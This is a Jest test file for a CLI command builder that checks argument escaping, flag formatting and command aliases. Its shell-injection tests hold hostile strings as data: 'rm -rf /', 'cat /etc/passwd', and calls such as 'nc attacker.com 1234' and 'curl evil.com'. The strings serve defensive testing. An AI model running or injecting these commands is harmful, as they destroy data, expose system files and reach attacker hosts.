/**
 * Tests for CLI command builder
 *
 * @task T2914
 */

import { describe, it, expect } from '@jest/globals';
import { escapeArg, formatFlags, buildCLICommand, mapDomainToCommand } from '../command-builder';

describe('command-builder', () => {
  describe('escapeArg', () => {
    it('should escape simple strings', () => {
      expect(escapeArg('hello')).toBe("'hello'");
      expect(escapeArg('T2914')).toBe("'T2914'");
    });

    it('should escape strings with single quotes', () => {
      expect(escapeArg("it's")).toBe("'it'\\''s'");
      expect(escapeArg("can't")).toBe("'can'\\''t'");
    });

    it('should escape strings with special characters', () => {
      expect(escapeArg('$(rm -rf /)')).toBe("'$(rm -rf /)'");
      expect(escapeArg('`cat /etc/passwd`')).toBe("'`cat /etc/passwd`'");
      expect(escapeArg('test; rm -rf /')).toBe("'test; rm -rf /'");
      expect(escapeArg('test && echo hacked')).toBe("'test && echo hacked'");
    });

    it('should escape strings with environment variables', () => {
      expect(escapeArg('$HOME')).toBe("'$HOME'");
      expect(escapeArg('${PATH}')).toBe("'${PATH}'");
    });

    it('should handle numbers', () => {
      expect(escapeArg(123)).toBe("'123'");
      expect(escapeArg(0)).toBe("'0'");
      expect(escapeArg(-42)).toBe("'-42'");
    });

    it('should handle booleans', () => {
      expect(escapeArg(true)).toBe("'true'");
      expect(escapeArg(false)).toBe("'false'");
    });

    it('should handle empty strings', () => {
      expect(escapeArg('')).toBe("''");
    });

    it('should handle whitespace', () => {
      expect(escapeArg('hello world')).toBe("'hello world'");
      expect(escapeArg('  spaces  ')).toBe("'  spaces  '");
      expect(escapeArg('\ttab\n')).toBe("'\ttab\n'");
    });

    it('should prevent shell injection attacks', () => {
      // Common injection patterns
      const attacks = [
        '; cat /etc/passwd',
        '| nc attacker.com 1234',
        '`curl evil.com`',
        '$(wget malware.sh)',
        '&& rm -rf /',
        '|| echo hacked',
      ];

      for (const attack of attacks) {
        const escaped = escapeArg(attack);
        // Must be wrapped in single quotes
        expect(escaped).toMatch(/^'.*'$/);
        // The attack string will be present but quoted, which is safe
        // The key is that shell metacharacters inside single quotes are literals
      }
    });
  });

  describe('formatFlags', () => {
    it('should format boolean flags', () => {
      expect(formatFlags({ json: true })).toEqual(['--json']);
      expect(formatFlags({ verbose: true })).toEqual(['--verbose']);
    });

    it('should skip false boolean flags', () => {
      expect(formatFlags({ json: false })).toEqual([]);
      expect(formatFlags({ json: true, verbose: false })).toEqual(['--json']);
    });

    it('should format string flags', () => {
      expect(formatFlags({ parent: 'T001' })).toEqual(['--parent', "'T001'"]);
      expect(formatFlags({ status: 'done' })).toEqual(['--status', "'done'"]);
    });

    it('should format number flags', () => {
      expect(formatFlags({ limit: 10 })).toEqual(['--limit', "'10'"]);
      expect(formatFlags({ depth: 3 })).toEqual(['--depth', "'3'"]);
    });

    it('should format array flags', () => {
      expect(formatFlags({ label: ['bug', 'urgent'] })).toEqual([
        '--label',
        "'bug'",
        '--label',
        "'urgent'",
      ]);
    });

    it('should skip undefined and null values', () => {
      expect(formatFlags({ json: true, parent: undefined, limit: null })).toEqual([
        '--json',
      ]);
    });

    it('should handle mixed flag types', () => {
      const result = formatFlags({
        json: true,
        parent: 'T001',
        limit: 10,
        verbose: false,
      });

      expect(result).toEqual(['--json', '--parent', "'T001'", '--limit', "'10'"]);
    });

    it('should escape flag values', () => {
      const result = formatFlags({
        notes: "Fix bug; don't crash",
        title: 'Task $(hack)',
      });

      expect(result).toEqual([
        '--notes',
        "'Fix bug; don'\\''t crash'",
        '--title',
        "'Task $(hack)'",
      ]);
    });

    it('should handle empty object', () => {
      expect(formatFlags({})).toEqual([]);
    });
  });

  describe('buildCLICommand', () => {
    it('should build simple command', () => {
      const cmd = buildCLICommand('cleo', 'tasks', 'show', ['T2914']);
      expect(cmd).toBe("cleo show 'T2914'");
    });

    it('should build command with flags', () => {
      const cmd = buildCLICommand('cleo', 'tasks', 'show', ['T2914'], {
        json: true,
      });
      expect(cmd).toBe("cleo show 'T2914' --json");
    });

    it('should build command with multiple arguments', () => {
      const cmd = buildCLICommand('cleo', 'tasks', 'update', ['T2914', 'status'], {
        value: 'done',
      });
      expect(cmd).toBe("cleo update 'T2914' 'status' --value 'done'");
    });

    it('should build command with no arguments', () => {
      const cmd = buildCLICommand('cleo', 'session', 'status', [], { json: true });
      expect(cmd).toBe("cleo session 'status' --json");
    });

    it('should handle custom CLI path', () => {
      const cmd = buildCLICommand('/usr/local/bin/cleo', 'tasks', 'list');
      expect(cmd).toBe("/usr/local/bin/cleo list");
    });

    it('should escape all user-controlled values', () => {
      const cmd = buildCLICommand(
        'cleo',
        'tasks',
        'add',
        ['Malicious $(rm -rf /)'],
        {
          notes: '; cat /etc/passwd',
          priority: '| nc evil.com',
        }
      );

      // Command should be safe - all user values wrapped in single quotes
      expect(cmd).toMatch(/^cleo add '.+' --notes '.+' --priority '.+'$/);

      // Verify all values are properly quoted (not executed as shell code)
      expect(cmd).toContain("'Malicious $(rm -rf /)'");
      expect(cmd).toContain("'; cat /etc/passwd'");
      expect(cmd).toContain("'| nc evil.com'");
    });

    it('should handle complex real-world command', () => {
      const cmd = buildCLICommand('cleo', 'tasks', 'create', [], {
        title: 'Fix authentication bug',
        description: "Users can't login after upgrade",
        parent: 'T001',
        priority: 'high',
        labels: ['bug', 'security'],
        json: true,
      });

      expect(cmd).toContain('cleo tasks');
      expect(cmd).toContain('--title');
      expect(cmd).toContain('--description');
      expect(cmd).toContain('--parent');
      expect(cmd).toContain('--priority');
      expect(cmd).toContain('--labels');
      expect(cmd).toContain('--json');
    });

    it('should escape multi-word operation (e.g., task title)', () => {
      // This is the actual pattern used by tasks.ts for 'add' command
      const cmd = buildCLICommand('cleo', 'add', 'Test Task With Spaces', [], {
        description: 'Testing multi-word title',
        json: true,
      });

      // Should escape the title as a single argument
      expect(cmd).toBe("cleo add 'Test Task With Spaces' --description 'Testing multi-word title' --json");
    });

    it('should handle empty operation string', () => {
      const cmd = buildCLICommand('cleo', 'list', '', [], { json: true });
      expect(cmd).toBe('cleo list --json');
    });

    it('should resolve depends alias to deps command', () => {
      const cmd = buildCLICommand('cleo', 'depends', 'T1234', [], { json: true });
      expect(cmd).toBe("cleo deps 'T1234' --json");
    });

    it('should resolve import alias to import-tasks command', () => {
      const cmd = buildCLICommand('cleo', 'import', '/tmp/tasks.json', [], { json: true });
      expect(cmd).toBe("cleo import-tasks '/tmp/tasks.json' --json");
    });

    it('should resolve lint alias to validate command', () => {
      const cmd = buildCLICommand('cleo', 'lint', 'T1234', [], { json: true });
      expect(cmd).toBe("cleo validate 'T1234' --json");
    });

    it('should resolve skill alias to skills command', () => {
      const cmd = buildCLICommand('cleo', 'skill', 'list', [], { json: true });
      expect(cmd).toBe("cleo skills 'list' --json");
    });

    it('should resolve version alias to version command', () => {
      const cmd = buildCLICommand('cleo', 'version', '', [], { json: true });
      expect(cmd).toBe('cleo version --json');
    });
  });

  describe('mapDomainToCommand parity aliases', () => {
    it('maps legacy parity risk domains to canonical commands', () => {
      expect(mapDomainToCommand('depends', 'T1')).toEqual({ command: 'deps', addOperationAsSubcommand: true });
      expect(mapDomainToCommand('import', 'x.json')).toEqual({ command: 'import-tasks', addOperationAsSubcommand: true });
      expect(mapDomainToCommand('lint', 'T1')).toEqual({ command: 'validate', addOperationAsSubcommand: true });
      expect(mapDomainToCommand('skill', 'list')).toEqual({ command: 'skills', addOperationAsSubcommand: true });
      expect(mapDomainToCommand('version', '')).toEqual({ command: 'version', addOperationAsSubcommand: false });
    });
  });
});
